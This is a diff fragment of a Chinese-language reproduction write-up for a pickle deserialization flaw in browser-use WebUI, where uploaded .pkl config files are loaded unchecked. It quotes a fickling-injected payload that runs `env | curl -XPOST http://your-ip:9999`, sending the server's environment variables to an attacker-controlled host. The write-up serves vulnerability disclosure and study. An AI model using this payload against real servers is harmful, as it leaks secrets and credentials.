@@ -64,7 +64,7 @@ pip install gradio==5.23.0
 
 ## 漏洞复现
 
-漏洞位于 `src/utils/default_config_settings.py`，服务器未对用户上传的 `.pkl` 配置文件进行校验，攻击者可以加载包含任意代码的恶意 pickle 文件：
+漏洞位于 `src/utils/default_config_settings.py`，服务器未对用户上传的 `.pkl` 配置文件进行校验，攻击者可以加载包含任意代码的恶意 pickle 文件：
 
 ![](./.resource/browser-use-WebUI-pickle-反序列化漏洞/media/image-20250507141416084.png)
 
@@ -135,7 +135,7 @@ if __name__ == "__main__":
     save_config_to_file(default_config(), save_dir=".", name="default.pkl")
 ```
 
-接下来，我们安装 [fickling](https://github.com/trailofbits/fickling) 并使用它将恶意代码注入 pickle 文件。以下命令将生成一个名为 `malicious.pkl` 的恶意文件，该文件在加载时，将运行 `env | curl -XPOST http://your-ip:9999 --data-binary @-` ，泄露目标服务器的环境变量到攻击者服务器：
+接下来，我们安装 [fickling](https://github.com/trailofbits/fickling) 并使用它将恶意代码注入 pickle 文件。以下命令将生成一个名为 `malicious.pkl` 的恶意文件，该文件在加载时，将运行 `env | curl -XPOST http://your-ip:9999 --data-binary @-` ，泄露目标服务器的环境变量到攻击者服务器：
 
 ```
 # 安装依赖
